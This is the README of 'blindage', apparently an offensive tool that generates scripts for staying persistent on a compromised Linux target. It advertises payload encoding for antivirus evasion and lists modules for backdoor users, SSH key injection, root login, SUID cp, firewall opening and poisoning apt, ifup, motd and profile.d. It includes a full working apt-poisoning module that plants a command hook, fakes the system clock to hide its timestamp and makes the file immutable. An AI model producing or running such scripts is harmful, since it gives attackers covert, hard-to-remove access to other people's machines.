
# blindage
A very simple persistence script generator. Its main goal is to automate rudimentary ways to persist on a target machine with minimal dependencies and easy setup.

### Demo
Your machine:

![](docs/demo1.gif)

Target machine:

![](docs/demo2.gif)

### Features
* Minimal dependencies to run the payload
* Base64 and AES payload encoding for AV evasion
* Configuration caching for subsequent uses
* Easy to extend with your own modules

### Available modules
* **history disabler** (Disables command history logging)
* **sshd cloner** (Creates additional sshd process using separate port)
* **service creator** (Creates a systemd service that runs a command)
* **user creator** (Adds a user to the system)
* **root sshd enabler** (Enables ssh login for root)
* **authorized_keys injector** (Adds a key to authorized_keys)
* **crontab injector** (Adds a command to crontab)
* **suid maked** (Adds suid bit to cp binary)
* **apt poisoner** (Adds apt entry with command execution)
* **ifup poisoner** (Adds ifup entry with command execution)
* **motd poisoner** (Adds motd entry with command execution)
* **profile poisoner** (Creates profile.d script)
* **network unblocker** (Opens ports in ufw and iptables)

### How to create a module
Create a `.yml` file inside `modules` folder with following structure:

    name: "apt poisoner"
    description: "Adds apt entry with command execution"
    category: persistence
    need_root: true
    variables:
      - name: cmd
        description: "Command to execute"
    priority: 1000
    tip: "APT is poisoned with command '{{cmd}}'"
    script: |
      NOW=$(date +@%s)
      date -s "$(stat -c '@%Z' /etc/hostname)"
      echo 'APT::Update::Pre-Invoke {"{{cmd}}"};' | sudo tee /etc/apt/apt.conf.d/20packageupdate
      touch /etc/apt/apt.conf.d/20packageupdate
      chattr +i /etc/apt/apt.conf.d/20packageupdate
      date -s "$NOW"
      unset NOW

Variables description:
|Variable|Empty value|Description|
|--|--|--|
|name|""|Name of the module to display in configuration menu|
|description|""|Description of the module to display in configuration menu|
|category|can't be empty|Category name, used for grouping in configuration menu|
|need_root|can't be empty|Should be True for modules that require root, False otherwise. Used in simple configuration mode and for grouping in configuration menu|
|variables|[]|Variables that can be injected in the script. Use `{{variable}}` to refer to the variable in the script|
|priority|can't be empty|Used to set execution order inside the payload. Higher the number, later the execution|
|tip|""|Used to display the "tip" after payload generation, so user can save result of module execution for later reference|
|script|can't be empty|Here goes the module payload|

**Note:** all the fields are required, if you don't need it - provide an empty value. Also, avoid using whitespaces in the module filename as it's used to generate function name inside the payload.
